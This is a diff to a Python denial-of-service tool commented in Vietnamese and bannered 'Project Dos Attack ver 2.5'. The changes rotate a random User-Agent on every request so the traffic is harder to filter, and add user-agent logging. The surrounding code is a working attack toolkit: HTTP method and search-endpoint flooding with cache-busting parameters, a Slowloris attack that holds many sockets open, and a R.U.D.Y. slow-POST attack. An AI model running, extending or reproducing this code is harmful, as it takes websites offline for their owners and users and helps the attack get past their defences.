@@ -167,11 +167,14 @@ def in_trang_thai(danh_sach_muc_tieu, so_luong_luong, thoi_gian_tan_cong):
             live.update(layout)
             time.sleep(toc_do_lam_moi)
 
-def log_message(message):
-    """Ghi log vào console và file, xử lý lỗi Unicode."""
+def log_message(message, user_agent=None):
+    """Ghi log vào console và file, xử lý lỗi Unicode, và thêm user agent."""
     if not hasattr(in_trang_thai, "logs"):
         in_trang_thai.logs = []
-    in_trang_thai.logs.append(message)
+
+    # Thêm user agent vào thông điệp log nếu có
+    log_entry = f"{message} - User-Agent: {user_agent}" if user_agent else message
+    in_trang_thai.logs.append(log_entry)
     if len(in_trang_thai.logs) > 10:
         in_trang_thai.logs.pop(0)
 
@@ -187,16 +190,17 @@ def log_message(message):
     if luu_log:
         try:
             with open("attack_log.txt", "a", encoding="utf-8") as log_file:
-                log_file.write(message + "\n")
+                log_file.write(log_entry + "\n")
         except UnicodeEncodeError as e:
             console.print(f"Lỗi ghi log vào file: {e}", style="bold red")
             try:
                 with open("attack_log.txt", "a", encoding="ascii", errors="ignore") as log_file:
-                    log_file.write(message.encode(
+                    log_file.write(log_entry.encode(
                         'ascii', 'ignore').decode('ascii') + "\n")
             except Exception as ex:
                 console.print(
                     f"Lỗi ghi log (ascii) vào file : {ex}", style="bold red")
+
 
 def lay_headers_tu_dong(url, method):
     """Hàm này để lấy các headers tự động dựa trên phương thức và URL."""
@@ -211,18 +215,18 @@ def lay_headers_tu_dong(url, method):
 
     if method == "slowloris":
         # Thêm headers cần thiết cho Slowloris
-        headers['X-a'] = str(random.randint(1, 5000))  
- 
+        headers['X-a'] = str(random.randint(1, 5000))
+
         if urlparse(url).scheme == 'https':
              headers['HTTPS'] = '1'
 
     elif method == "rudy":
         # Thêm headers cần thiết cho R.U.D.Y
-        headers['Content-Type'] = 'application/x-www-form-urlencoded' 
+        headers['Content-Type'] = 'application/x-www-form-urlencoded'
         # Thử nghiệm 1 header giả mạo khác
         headers['X-RUDY'] = '1'
 
- 
+
     global headers_da_su_dung
     headers_da_su_dung[method][url] = headers
     return headers
@@ -247,6 +251,9 @@ async def tan_cong_url_get(session, url, headers, sem):
 
     async with sem:
         while not dung_tan_cong:
+            # Lấy User-Agent NGẪU NHIÊN cho MỖI request
+            headers['User-Agent'] = lay_ngau_nhien_user_agent()
+
             url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
             try:
                 async with session.get(url_with_params, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
@@ -254,11 +261,11 @@ async def tan_cong_url_get(session, url, headers, sem):
                         if phan_hoi.status == 200:
                             yeu_cau_thanh_cong += 1
                             log_message(
-                                f"[green]Yêu cầu GET thành công đến: {url_with_params}[/]")
+                                f"[green]Yêu cầu GET thành công đến: {url_with_params}[/]", headers['User-Agent'])
                         else:
                             yeu_cau_that_bai += 1
                             log_message(
-                                f"[red]Yêu cầu GET thất bại đến: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]")
+                                f"[red]Yêu cầu GET thất bại đến: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent']) 
                         tong_so_yeu_cau += 1
                         tien_trinh[url]['completed'] += 1
 
@@ -266,7 +273,7 @@ async def tan_cong_url_get(session, url, headers, sem):
                 with lock:
                     yeu_cau_that_bai += 1
                     log_message(
-                        f"[red]Yêu cầu GET bị timeout đến: {url_with_params}[/]")
+                        f"[red]Yêu cầu GET bị timeout đến: {url_with_params}[/]", headers['User-Agent'])
                     tong_so_yeu_cau += 1
                     tien_trinh[url]['completed'] += 1
 
@@ -274,7 +281,7 @@ async def tan_cong_url_get(session, url, headers, sem):
                 with lock:
                     yeu_cau_that_bai += 1
                     log_message(
-                        f"[red]Lỗi kết nối đến {url_with_params}: {e}[/]")
+                        f"[red]Lỗi kết nối đến {url_with_params}: {e}[/]", headers['User-Agent'])  # Sử dụng headers['User-Agent']
                     tong_so_yeu_cau += 1
                     tien_trinh[url]['completed'] += 1
 
@@ -286,12 +293,15 @@ async def tan_cong_url_get(session, url, headers, sem):
                     tong_so_yeu_cau += 1
                     tien_trinh[url]['completed'] += 1
 
+
 async def tan_cong_url_mixed(session, url, headers, method, sem):
     """Tấn công URL bằng các phương thức khác nhau (sử dụng aiohttp)."""
     global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau
 
     async with sem:
         while not dung_tan_cong:
+            # Lấy User-Agent NGẪU NHIÊN cho MỖI request
+            headers['User-Agent'] = lay_ngau_nhien_user_agent()
             try:
                 if method == 'GET':
                     url_with_params = f"{url}?{random.randint(1000, 9999)}={random.randint(1000, 9999)}" if random.choice([True, False]) else url
@@ -299,10 +309,10 @@ async def tan_cong_url_mixed(session, url, headers, method, sem):
                         with lock:
                             if phan_hoi.status == 200:
                                 yeu_cau_thanh_cong += 1
-                                log_message(f"[green]Mô phỏng {method} thành công: {url_with_params}[/]")
+                                log_message(f"[green]Mô phỏng {method} thành công: {url_with_params}[/]", headers['User-Agent'])
                             else:
                                 yeu_cau_that_bai += 1
-                                log_message(f"[red]Mô phỏng {method} thất bại: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]")
+                                log_message(f"[red]Mô phỏng {method} thất bại: {url_with_params} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
 
                 elif method == 'POST':
                     data_size = random.randint(100, 1000)
@@ -311,10 +321,10 @@ async def tan_cong_url_mixed(session, url, headers, method, sem):
                         with lock:
                             if phan_hoi.status == 200:
                                 yeu_cau_thanh_cong += 1
-                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]")
+                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]", headers['User-Agent'])
                             else:
                                 yeu_cau_that_bai += 1
-                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]")
+                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                 elif method == 'PUT':
                     data_size = random.randint(100, 1000)
                     data = os.urandom(data_size)
@@ -322,19 +332,19 @@ async def tan_cong_url_mixed(session, url, headers, method, sem):
                         with lock:
                             if phan_hoi.status == 200:
                                 yeu_cau_thanh_cong += 1
-                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]")
+                                log_message(f"[green]Mô phỏng {method} thành công: {url} - Kích thước dữ liệu: {data_size} bytes[/]", headers['User-Agent'])
                             else:
                                 yeu_cau_that_bai += 1
-                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]")
+                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                 elif method == 'DELETE':
                     async with session.delete(url, headers=headers, timeout=thoi_gian_timeout) as phan_hoi:
                         with lock:
                             if phan_hoi.status == 200:
                                 yeu_cau_thanh_cong += 1
-                                log_message(f"[green]Mô phỏng {method} thành công: {url}[/]")
+                                log_message(f"[green]Mô phỏng {method} thành công: {url}[/]", headers['User-Agent'])
                             else:
                                 yeu_cau_that_bai += 1
-                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]")
+                                log_message(f"[red]Mô phỏng {method} thất bại: {url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
                 else:
                     with lock:
                         console.print(f"Phương thức {method} chưa được hỗ trợ.", style="yellow")
@@ -344,30 +354,33 @@ async def tan_cong_url_mixed(session, url, headers, method, sem):
                 with lock:
                     yeu_cau_that_bai += 1
                     log_message(
-                        f"[red]Yêu cầu {method} bị timeout đến: {url}[/]")
+                        f"[red]Yêu cầu {method} bị timeout đến: {url}[/]", headers['User-Agent'])
 
             except aiohttp.ClientError as e:
                 with lock:
                     yeu_cau_that_bai += 1
-                    log_message(f"[red]Lỗi kết nối: {e}[/]")
+                    log_message(f"[red]Lỗi kết nối: {e}[/]", headers['User-Agent'])
 
             except Exception as e:
                 with lock:
                     log_message(
-                        f"Đã xảy ra lỗi không mong đợi: {e}[/]")
+                        f"Đã xảy ra lỗi không mong đợi: {e}[/]", headers['User-Agent'])
                     console.print(
                         f"Đã xảy ra lỗi không mong đợi: {e}", style="bold red")
             finally:
                 with lock:
                     tong_so_yeu_cau += 1
                     tien_trinh[url]['completed'] += 1
-                    
+
 async def tan_cong_url_search(session, url_base, headers, tu_khoa, sem):
     """Tấn công URL tìm kiếm (sử dụng aiohttp)."""
     global yeu_cau_thanh_cong, yeu_cau_that_bai, tong_so_yeu_cau
 
     async with sem:
         while not dung_tan_cong:
+           # Lấy User-Agent NGẪU NHIÊN cho MỖI request
+            headers['User-Agent'] = lay_ngau_nhien_user_agent()
+
             try:
                 tu_khoa_chon = " ".join(random.sample(tu_khoa, random.randint(1, min(3, len(tu_khoa))))) if tu_khoa else ""
                 search_url = f"{url_base}{tu_khoa_chon}"
@@ -375,31 +388,28 @@ async def tan_cong_url_search(session, url_base, headers, tu_khoa, sem):
                     with lock:
                         if phan_hoi.status == 200:
                             yeu_cau_thanh_cong += 1
-                            log_message(f"[green]Tìm kiếm thành công với từ khóa: {tu_khoa_chon} - URL: {search_url}[/]")
+                            log_message(f"[green]Tìm kiếm thành công với từ khóa: {tu_khoa_chon} - URL: {search_url}[/]", headers['User-Agent'])
                         else:
                             yeu_cau_that_bai += 1
-                            log_message(f"[red]Tìm kiếm thất bại với từ khóa: {tu_khoa_chon} - URL: {search_url} - Mã trạng thái: {phan_hoi.status}[/]")
-                            
+                            log_message(f"[red]Tìm kiếm thất bại với từ khóa: {tu_khoa_chon} - URL: {search_url} - Mã trạng thái: {phan_hoi.status}[/]", headers['User-Agent'])
+
             except asyncio.TimeoutError:
                 with lock:
                     yeu_cau_that_bai += 1
-                    log_message(f"[red]Yêu cầu tìm kiếm bị timeout đến: {search_url}[/]")
+                    log_message(f"[red]Yêu cầu tìm kiếm bị timeout đến: {search_url}[/]", headers['User-Agent'])
 
             except aiohttp.ClientError as e:
                 with lock:
                     yeu_cau_that_bai += 1
-                    log_message(f"[red]Lỗi kết nối khi tìm kiếm: {e}[/]")
+                    log_message(f"[red]Lỗi kết nối khi tìm kiếm: {e}[/]", headers['User-Agent'])
 
             except Exception as e:
                 with lock:
-                    log_message(f"Đã xảy ra lỗi không mong đợi khi tìm kiếm: {e}[/]")
+                    log_message(f"Đã xảy ra lỗi không mong đợi khi tìm kiếm: {e}[/]", headers['User-Agent'])
                     console.print(f"Đã xảy ra lỗi không mong đợi khi tìm kiếm: {e}", style="bold red")
             finally:
                 with lock:
                     tong_so_yeu_cau += 1
-                    # Cập nhật tiến trình cho URL tìm kiếm (nếu đang sử dụng)
-                    # Ví dụ:
-                    # tien_trinh[url_base]['completed'] += 1
 
 async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
     """Tấn công Slowloris."""
@@ -421,12 +431,13 @@ async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
                     else:
                          protocol = "HTTP"
 
-                    
+
                     s.connect((urlparse(url).hostname, port))
                     sockets.append(s)
 
 
-
+                    # Lấy User-Agent NGẪU NHIÊN cho MỖI request (initial request)
+                    headers['User-Agent'] = lay_ngau_nhien_user_agent()
                     request = f"GET {url} {protocol}/1.1\r\n"
                     for header, value in headers.items():
                         request += f"{header}: {value}\r\n"
@@ -434,19 +445,20 @@ async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
                     s.send(request.encode())
 
                     log_message(
-                        f"[yellow]Đã gửi header đến {url}:{port} (Slowloris)...[/]")
+                        f"[yellow]Đã gửi header đến {url}:{port} (Slowloris)...[/]", headers['User-Agent'])
 
                 except socket.error as e:
                     with lock:
                         yeu_cau_that_bai += 1
                         log_message(
-                            f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]")
+                            f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                 except Exception as e:
                     with lock:
                         log_message(
-                            f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]")
+                            f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
 
             while not dung_tan_cong:
+               
                 for s in sockets:
                     port = s.getpeername()[1] if s else "N/A"
                     try:
@@ -457,12 +469,12 @@ async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
                             sockets.remove(s)
                             yeu_cau_that_bai += 1
                             log_message(
-                                f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]")
+                                f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                     except Exception as e:
                         with lock:
                             sockets.remove(s)
                             log_message(
-                                f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]")
+                                f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
 
 
                 for port in ports:
@@ -477,8 +489,10 @@ async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
                                     new_s, server_hostname=urlparse(url).hostname)
 
                             new_s.connect((urlparse(url).hostname, port))
-                            
-                            
+
+
+                            # Lấy User-Agent NGẪU NHIÊN cho MỖI request (new socket request)
+                            headers['User-Agent'] = lay_ngau_nhien_user_agent()
                             request = f"GET {url} HTTP/1.1\r\n"
                             for header, value in headers.items():
                                 request += f"{header}: {value}\r\n"
@@ -486,25 +500,25 @@ async def slowloris_attack(session, url, headers, sem, ports=[80, 443]):
                             new_s.send(request.encode())
 
                             log_message(
-                                f"[yellow]Đã tạo socket mới cho {url}:{port} (Slowloris)...[/]")
+                                f"[yellow]Đã tạo socket mới cho {url}:{port} (Slowloris)...[/]", headers['User-Agent'])
                             sockets.append(new_s)
                         except socket.error as e:
                             with lock:
                                 yeu_cau_that_bai += 1
                                 log_message(
-                                    f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]")
+                                    f"[red]Lỗi Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
                         except Exception as e:
                             with lock:
                                 log_message(
-                                    f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]")
+                                    f"[red]Lỗi không xác định trong Slowloris với {url}:{port}: {e}[/]", headers['User-Agent'])
 
                 if not sockets:
                     log_message(
-                        "[red]Không còn socket nào hoạt động, kết thúc Slowloris...[/]")
+                        "[red]Không còn socket nào hoạt động, kết thúc Slowloris...[/]", headers['User-Agent'])
                     break
 
                 await asyncio.sleep(15)
-            
+
                 for s in sockets:
                     if s:
                         s.close()
@@ -519,40 +533,42 @@ async def rudy_attack(session, url, headers, sem):
 
     async with sem:
         while not dung_tan_cong:
-            s = None  
+            s = None
             try:
-                log_message(f"[yellow]Đang thử kết nối đến {url} cho R.U.D.Y...[/]")
+                # Lấy User-Agent NGẪU NHIÊN cho MỖI request (initial request)
+                headers['User-Agent'] = lay_ngau_nhien_user_agent()
+                log_message(f"[yellow]Đang thử kết nối đến {url} cho R.U.D.Y...[/]", headers['User-Agent'])
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((urlparse(url).hostname, 80))
-                log_message(f"[green]Kết nối thành công đến {url} cho R.U.D.Y.[/]")
+                log_message(f"[green]Kết nối thành công đến {url} cho R.U.D.Y.[/]", headers['User-Agent'])
 
                 request = f"POST {url} HTTP/1.1\r\n"
                 for header, value in headers.items():
                     request += f"{header}: {value}\r\n"
                 request += f"Content-Length: {random.randint(5000, 10000)}\r\n\r\n" # Sửa content-length lớn, random
                 s.send(request.encode())
-                log_message(f"[yellow]Đã gửi POST header đến {url} (R.U.D.Y)...[/]")
+                log_message(f"[yellow]Đã gửi POST header đến {url} (R.U.D.Y)...[/]", headers['User-Agent'])
 
                 # Gửi từng byte dữ liệu với độ trễ
                 while not dung_tan_cong:
                     data = os.urandom(1)
                     try:
                         s.send(data)
-                        log_message(f"[yellow]Đã gửi 1 byte dữ liệu đến {url} (R.U.D.Y)...[/]")
+                        log_message(f"[yellow]Đã gửi 1 byte dữ liệu đến {url} (R.U.D.Y)...[/]", headers['User-Agent'])
                     except socket.error as e:
                         with lock:
                             yeu_cau_that_bai += 1
-                            log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]")
+                            log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
                             break
                     await asyncio.sleep(random.uniform(5, 15))  # Gửi 1 byte sau 5-15 giây
 
             except socket.error as e:
                 with lock:
                     yeu_cau_that_bai += 1
-                    log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]")
+                    log_message(f"[red]Lỗi R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
             except Exception as e:
                 with lock:
-                    log_message(f"[red]Lỗi không xác định trong R.U.D.Y với {url}: {e}[/]")
+                    log_message(f"[red]Lỗi không xác định trong R.U.D.Y với {url}: {e}[/]", headers['User-Agent'])
             finally:
                 with lock:
                     if s:
@@ -571,7 +587,7 @@ async def tan_cong_tong_the(danh_sach_url, so_luong_luong, phuong_thuc_tan_cong,
     async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, ssl=False)) as session:
       for url in danh_sach_muc_tieu:
           sem = sems[url]
-          
+
           if phuong_thuc_tan_cong == 'slowloris':
               if cach_lay_headers[url] == "auto":
                 headers = lay_headers_tu_dong(url, "slowloris")
@@ -591,8 +607,8 @@ async def tan_cong_tong_the(danh_sach_url, so_luong_luong, phuong_thuc_tan_cong,
                         rudy_attack(session, url, headers, sem))
                   tasks.append(task)
           else:
-
                 headers = tao_headers_da_dang(url, custom_headers)
+
 
           if phuong_thuc_tan_cong == 'get':
             for _ in range(so_luong_luong):
@@ -612,7 +628,7 @@ async def tan_cong_tong_the(danh_sach_url, so_luong_luong, phuong_thuc_tan_cong,
               for _ in range(so_luong_luong):
                   task_search = asyncio.ensure_future(tan_cong_url_search(session, search_url_base, headers, search_keywords, sem))
                   tasks.append(task_search)
-              
+
       await asyncio.gather(*tasks)
 
 def stop_attack():
@@ -666,7 +682,7 @@ def hien_thi_lua_chon():
 
         if phuong_thuc_tan_cong in headers_da_su_dung and url in headers_da_su_dung[phuong_thuc_tan_cong]:
             headers_tree = config_tree.add(
-                f"        └─── [bold]Headers used for {url}[/]"  
+                f"        └─── [bold]Headers used for {url}[/]"
             )
             for header, value in headers_da_su_dung[phuong_thuc_tan_cong][url].items():
                 headers_tree.add(f"            ├─── [yellow]{header}[/]: [green]{value}[/]")
@@ -684,35 +700,35 @@ def nhap_tham_so():
 
     bieu_tuong = r"""
 
- _____                                                                             _____ 
-( ___ )                                                                           ( ___ )
- |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | 
- |   |           _____                    _____                    _____           |   | 
- |   |          /\    \                  /\    \                  /\    \          |   | 
- |   |         /::\    \                /::\    \                /::\____\         |   | 
- |   |        /::::\    \               \:::\    \              /::::|   |         |   | 
- |   |       /::::::\    \               \:::\    \            /:::::|   |         |   | 
- |   |      /:::/\:::\    \               \:::\    \          /::::::|   |         |   | 
- |   |     /:::/__\:::\    \               \:::\    \        /:::/|::|   |         |   | 
- |   |    /::::\   \:::\    \              /::::\    \      /:::/ |::|   |         |   | 
- |   |   /::::::\   \:::\    \    ____    /::::::\    \    /:::/  |::|   | _____   |   | 
- |   |  /:::/\:::\   \:::\____\  /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \  |   | 
- |   | /:::/  \:::\   \:::|    |/::\   \/:::/  \:::\____\/:: /    |::|   /::\____\ |   | 
- |   | \::/   |::::\  /:::|____|\:::\  /:::/    \::/    /\::/    /|::|  /:::/    / |   | 
- |   |  \/____|:::::\/:::/    /  \:::\/:::/    / \/____/  \/____/ |::| /:::/    /  |   | 
- |   |        |:::::::::/    /    \::::::/    /                   |::|/:::/    /   |   | 
- |   |        |::|\::::/    /      \::::/____/                    |::::::/    /    |   | 
- |   |        |::| \::/____/        \:::\    \                    |:::::/    /     |   | 
- |   |        |::|  ~|               \:::\    \                   |::::/    /      |   | 
- |   |        |::|   |                \:::\    \                  /:::/    /       |   | 
- |   |        \::|   |                 \:::\____\                /:::/    /        |   | 
- |   |         \:|   |                  \::/    /                \::/    /         |   | 
- |   |          \|___|                   \/____/                  \/____/          |   | 
+ _____
+( ___ )
+ |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   |
+ |   |           _____                    _____                    _____           |   |
+ |   |          /\    \                  /\    \                  /\    \          |   |
+ |   |         /::\    \                /::\    \                /::\____\         |   |
+ |   |        /::::\    \               \:::\    \              /::::|   |         |   |
+ |   |       /::::::\    \               \:::\    \            /:::::|   |         |   |
+ |   |      /:::/\:::\    \               \:::\    \          /::::::|   |         |   |
+ |   |     /:::/__\:::\    \               \:::\    \        /:::/|::|   |         |   |
+ |   |    /::::\   \:::\    \              /::::\    \      /:::/ |::|   |         |   |
+ |   |   /::::::\   \:::\    \    ____    /::::::\    \    /:::/  |::|   | _____   |   |
+ |   |  /:::/\:::\   \:::\____\  /\   \  /:::/\:::\    \  /:::/   |::|   |/\    \  |   |
+ |   | /:::/  \:::\   \:::|    |/::\   \/:::/  \:::\____\/:: /    |::|   /::\____\ |   |
+ |   | \::/   |::::\  /:::|____|\:::\  /:::/    \::/    /\::/    /|::|  /:::/    / |   |
+ |   |  \/____|:::::\/:::/    /  \:::\/:::/    / \/____/  \/____/ |::| /:::/    /  |   |
+ |   |        |:::::::::/    /    \::::::/    /                   |::|/:::/    /   |   |
+ |   |        |::|\::::/    /      \::::/____/                    |::::::/    /    |   |
+ |   |        |::| \::/____/        \:::\    \                    |:::::/    /     |   |
+ |   |        |::|  ~|               \:::\    \                   |::::/    /      |   |
+ |   |        |::|   |                \:::\    \                  /:::/    /       |   |
+ |   |        \::|   |                 \:::\____\                /:::/    /        |   |
+ |   |         \:|   |                  \::/    /                \::/    /         |   |
+ |   |          \|___|                   \/____/                  \/____/          |   |
  |   |                                                                             |   |
  |   |                            - Powered by: Rin -                              |   |
  |   |                     |   Project Dos Attack ver 2.5   |                      |   |
- |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| 
-(_____)                                                                           (_____)	
+ |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___|
+(_____)                                                                           (_____)
     """
     in_bieu_tuong(bieu_tuong)
 
@@ -722,7 +738,7 @@ def nhap_tham_so():
     ports = []
 
 
-    global is_user_agent_from_file, user_agent_duoc_chon  
+    global is_user_agent_from_file, user_agent_duoc_chon
     danh_sach_user_agent_lon = []  # Dùng lại nên cần reset
 
     phuong_thuc_tan_cong = Prompt.ask(
@@ -842,21 +858,21 @@ def nhap_tham_so():
         ten_file_user_agent = Prompt.ask("Nhập tên file chứa User-Agent (ví dụ: user_agents.txt)")
         danh_sach_user_agent_lon = doc_danh_sach_user_agent(ten_file_user_agent)
         if danh_sach_user_agent_lon:
-            is_user_agent_from_file = True  
+            is_user_agent_from_file = True
             user_agent_duoc_chon = ten_file_user_agent
-        else:  
+        else:
             is_user_agent_from_file = False
-            user_agent_duoc_chon = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36" 
-            console.print(f"[yellow]File User-Agent không hợp lệ. Sử dụng User-Agent mặc định.[/]")  
+            user_agent_duoc_chon = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
+            console.print(f"[yellow]File User-Agent không hợp lệ. Sử dụng User-Agent mặc định.[/]")
 
     else:
         user_agent_thu_cong = Prompt.ask("Nhập User-Agent thủ công")
         is_user_agent_from_file = False
         user_agent_duoc_chon = user_agent_thu_cong
 
-    if not is_user_agent_from_file or not danh_sach_user_agent_lon:  # Nếu ko chọn from file hoặc không có user agent nào trong file
-        custom_headers['User-Agent'] = user_agent_duoc_chon  # Thì dùng user agent nhập vào
-    else:  # nếu không, user agent đã được random và gán vào header trong tan_cong_tong_the rồi. Reset giá trị ở mỗi đầu vòng lặp tan_cong_tong_the cũng hợp lệ.
+    if not is_user_agent_from_file or not danh_sach_user_agent_lon:  
+        custom_headers['User-Agent'] = user_agent_duoc_chon 
+    else: 
       custom_headers['User-Agent'] = lay_ngau_nhien_user_agent()
     if phuong_thuc_tan_cong == "slowloris":
         chon_cong = Prompt.ask(
